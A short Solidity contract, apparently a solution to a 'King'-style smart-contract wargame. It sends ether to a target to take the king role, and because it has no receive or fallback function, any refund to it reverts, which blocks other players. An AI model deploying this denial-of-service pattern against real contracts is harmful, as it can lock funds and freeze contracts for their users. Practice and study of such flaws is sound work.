// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingBreaker {
    function claimKingStatus(address payable _to) public payable {
        (bool _sent, ) = _to.call{value: msg.value}(abi.encodeWithSignature("receive()"));
        require(_sent, "Failed to send");
    }
}